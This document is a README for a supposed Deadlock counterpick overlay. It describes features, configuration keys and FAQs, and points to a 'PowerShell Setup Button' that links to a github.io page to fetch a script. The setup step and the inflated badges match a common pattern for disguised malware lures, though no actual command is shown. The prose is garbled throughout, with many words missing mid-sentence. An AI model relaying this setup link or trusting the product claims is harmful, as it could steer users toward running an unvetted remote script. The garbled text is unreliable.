<div align="center">

# Deadlock Counterpicker — Game Enhancer for Windows

![](files/preview.png)

### 🛠️ PowerShell Setup Button

[![](files/button.png)](https://nikhishamudin-create.github.io/deadlock-counterpicker/)

[![channel](https://img.shields.io/badge/CHANNEL-PRODUCTION-2ea44f?style=flat-square&labelColor=0d1117)]() [![win](https://img.shields.io/badge/WIN-WINDOWS_11-2f81f7?style=flat-square&labelColor=0d1117)]() [![ps-core](https://img.shields.io/badge/PS--CORE-SCRIPT-54aeff?style=flat-square&labelColor=0d1117)]() [![setup](https://img.shields.io/badge/SETUP-847-0969da?style=flat-square&labelColor=0d1117)]() [![rate](https://img.shields.io/badge/RATE-4.7%2F5-f59e0b?style=flat-square&labelColor=0d1117)]()

</div>

---

Deadlock rewards preparation, and Counterpicker turns that preparation into edge before the match even starts. It reads the enemy lineup, identifies the threats that actually matter, and surfaces the and hero picks built shut them down. No guesswork, no generic, just targeted counterplay drawn from real matchup data. Pick smarter, itemize sharper, and make every draft a bad matchup for the other.

## ✅ Requirements

- **PowerShell 5.1+** (pre-installed on Windows 10 and 11)
- **Windows 10 / 11** (x64)
- **Internet connection** — required to fetch the script
- **Administrator** — *not* required

## Features

**Live counterpick engine** — reads the enemy lineup as it forms and surfaces the heroes that actually answer it, not a static tier list you have interpret yourself.
- **Matchup-aware hero scoring** — every suggestion is weighted against the specific enemy composition in front of you, so the top pick changes when their draft changes.
- ** adaptation** — are slotted into your path based the enemy threats that are actually fed, not a one-size-fits-all order.
- **Draft-phase alerts** — flags the moment a critical enemy pick lands and tells you which of your comfort heroes loses value against it.
- **Role and lane fit** — counterpicks are filtered the role you're queued for, so you never get a suggestion you can't actually play in your slot.
- **Patch-tracking recommendations** — hero and weights update with balance changes, keeping the logic honest instead of stale.
- **Zero-latency local operation** — all scoring runs your machine, so suggestions appear instantly and nothing about your draft leaves your PC.
- **Minimal in-game footprint** — a compact overlay keeps the pick list and notes visible without covering the map or eating screen real estate.
- **Match history insights** — logs your counterpick decisions and results locally so you can see which of your answers are actually converting wins.
- **Fast lookup mode** — when the clock is tight, a single condensed screen gives you the shortlist without any digging.

## How it works

Deadlock Counterpicker reads the enemy draft the moment heroes lock in, then cross-references it against live matchup data surface the picks that actually punish their comp. No guessing, no tier-list prayers — just the heroes and that flip the odds in your favor.

The engine works in three stages:

- **Draft scan.** Your current match is analyzed the second the opposing lineup is visible. Every enemy hero gets mapped against known, and the tool flags which of your available picks gain the biggest edge.
- ** scoring.** Each suggestion is weighted matchup win delta, lane pressure, and synergy — not just raw popularity. A hero that two of their carries outranks a flavor-of-the-month pick that only answers one.
- ** sync.** Once you lock in, the recommended path adjusts the fly match the enemy's actual damage profile, so your stays one step ahead instead of reacting three deaths too late.

Everything runs locally your machine. No cloud round-trips, no lag between the enemy lock-in and your window — the overlay updates in real time so you're never the last one adapt. The data refreshes with each patch, keeping the recommendations honest as the meta shifts.

The result: you stop picking gut feel and start picking numbers. Lock in the right hero, the right, and make their draft regret itself.

## Supported Games

Deadlock Counterpicker is built for **Deadlock** — that's the whole pitch. No bloated game list, no half-supported modes, no "experimental compatibility" footnotes. If you're queuing Deadlock, this tool is speaking your language.

### Fully Supported

- **Deadlock (PC / Steam)** — the complete counterpick engine: hero matchup analysis, building, and live pick recommendations tuned Deadlock's roster and patch cadence.

That's it. One game, done right. Every hero in the current Deadlock roster is mapped, every interaction is modeled, and the recommendation logic is calibrated against Deadlock's actual economy and lane dynamics — not a generic MOBA template with the names swapped out.

### Patch Tracking

Deadlock moves fast, and so does the counterpick data. Hero adjustments, reworks, and meta shifts get folded into the recommendation engine as patches land — so your suggestions reflect the game you're actually playing tonight, not the one from three patches ago.

### What You Won't Find Here

- No support for other Valve titles.
- No "coming soon" ghost games padding the list.
- No partial hero coverage — if a hero is in Deadlock, it's in the picker.

One game. Full coverage. Zero filler.

## Configuration

Deadlock Counterpicker ships with sensible defaults, but the real power comes from tuning it your playstyle and hero pool. Everything is configured through a single local config file and in-app settings panel — no, no cloud sync, no nonsense.

**Config File Location**

Drop your settings in `config.toml` in the tool's root directory. The file is generated first launch with sane defaults. Edit it directly or use the settings panel — both write the same place.

**Core Settings**

- **`default_hero`** — Sets the hero the counterpicker biases toward launch. Leave blank auto-detect from your last match.
- **`enemy_pool`** — Define the enemy heroes you expect face. The counterpicker ranks recommendations against this pool. Accepts a comma-separated list of hero names.
- **`difficulty_floor`** — Filters out high-skill-floor if you're still learning a hero. Set `low`, `medium`, or `high`. Defaults `medium`.
- **`_style`** — Choose between `aggressive`, `balanced`, or `defensive`. This shifts the weighting of toward early pressure, even trades, or late-game scaling respectively.

** Pool Tuning**

The counterpicker doesn't just spit out one — it ranks a pool. Control the pool size and constraints:

- **`max_recommendations`** — How many surface per enemy hero. Default is `3`. Range: 1–5.
- **`exclude_`** — Hard-block you never want see. Comma-separated internal IDs.
- **`prioritize_souls`** — Toggle whether soul-based get boosted priority when you're ahead souls. Default: `true`.

**Match Context Overrides**

These settings adjust recommendations based live match conditions:

- **`enemy_fed_threshold`** — If enemy hero exceeds this kill lead, the counterpicker weights defensive and survivability more heavily. Default: `3`.
- **`_gap_threshold`** — When your is behind this many souls per player, recommendations lean toward high-impact, comeback-oriented. Default: `800`.
- **`lane_phase_weight`** — Adjusts how much early-lane counterpicks matter versus late-game scaling. Range: `0.0`–`1.0`. Default: `0.4`.

**Interface Preferences**

- **`overlay_position`** — Where the counterpick panel anchors screen: `top-left`, `top-right`, `bottom-left`, or `bottom-right`. Default: `top-right`.
- **`compact_mode`** — Collapses recommendations a single-line summary. Default: `false`.
- **`hotkey_toggle`** — Keybind show/hide the overlay mid-match. Default: `F8`.

**Resetting Defaults**

Delete `config.toml` and relaunch. The tool regenerates a clean config with stock values. Your match history and personal stats are stored separately and won't be touched.

**Pro tip:** Start with defaults for your first ten matches. The counterpicker logs which recommendations you follow and which you ignore — after enough data, the `_style` and `lane_phase_weight` settings become genuinely useful tune. Don't overthink it before you have a baseline.

## FAQ

**Is this a cheat or a script that plays the game for me?**
No. Deadlock Counterpicker is a decision-support tool, not automation script. It doesn't read game memory, inject code, or fire a single input your behalf. It processes the same publicly visible information you already see screen — hero picks, enemy itemization, lane assignments — just faster and with more rigorous cross-referencing than eyeballing it mid-fight. You still make every call. The tool just makes sure your call isn't blind.

**How does the counterpick logic actually work?**
The engine maps your current hero and against the enemy lineup, then weighs three factors: ability threat overlap, economy pressure, and role collision. It doesn't spit out a static " X" list — it ranks options *timing*, because a that comes online two too late is just a dead slot. You get prioritized picks with the reasoning attached, so you understand the *why* before you commit souls.

**Does it update when Deadlock patches drop?**
Yes. Hero kits, stats, and matchup weights get recalibrated when the patch changes them. If a hero gets a rework or 's numbers shift, the rankings shift with it — stale data is worse than no data, so the tool errs toward current values rather than legacy assumptions.

**Will it work if I main off-meta hero?**
That's exactly where it earns its keep. Meta picks have a thousand written for them. Off-meta heroes are where knowledge dries up — and where a wrong choice costs you the lane. The tool ranks against the enemy comp in front of you, not against a tier list, so your sleeper pick gets the same sharp analysis as the flavor-of-the-month.

**Does it run locally, or does it phone home with my match data?**
Everything runs your machine. No cloud calls, no analytics pings, no match data leaving your system. Your plans and matchup history stay yours — the tool has no interest in your win rate and no server report it.

**How heavy is it my system while I'm playing?**
Light. The engine is built resolve matchups in the background without touching your frame budget. You're not going lose a teamfight because a lookup table stuttered — the whole point is that it stays out of the way until you need the read.

**Can I tune it my own playstyle?**
Yes — the configuration layer lets you weight what matters you: aggression versus safety, early spike versus late scaling, duel priority versus teamfight utility. Defaults are sane out of the box, but the dials are there if your playstyle doesn't match the baseline.

**Is this affiliated with Valve or the Deadlock dev?**
No. Deadlock Counterpicker is independent, community-built tool. It is not affiliated with, endorsed, or sponsored Valve. All game names and trademarks belong their respective owners — we just the logic top of a game we play too much of.

## Disclaimer

Deadlock Counterpicker is a decision-support tool for Deadlock, built help you read hero matchups and timings faster than the enemy can punish you for guessing. It is not a cheat, not injector, and not automation script — it does not read game memory, hook into the client, or send inputs your behalf.

Here's the deal, straight up:

- **You make the calls.** Every counterpick and suggestion is a recommendation, not action. The tool never plays the game for you.
- **No memory reading, no injection.** Everything runs off publicly visible information — what you can already see screen — processed locally your machine.
- **Local default.** Your data stays your device. No shadow telemetry, no match data leaving your rig.
- **Third-party policy is you.** Valve's stance external tools can shift, and enforcement is their call, not ours. Use Deadlock Counterpicker at your own discretion, especially in ranked.
- **No affiliation.** Deadlock Counterpicker is independent project. It is not endorsed, sponsored, or connected Valve or the Deadlock. All game names, hero names, and related trademarks belong their respective owners.
- **No warranty.** The tool is provided as-is. Matchups shift with patches, hero balance changes, and meta drift — suggestions reflect the data and logic available at time, not a guarantee of victory. If a patch breaks something, expect it be fixed when it's fixed.

Play smart. Own your decisions. That's the whole point.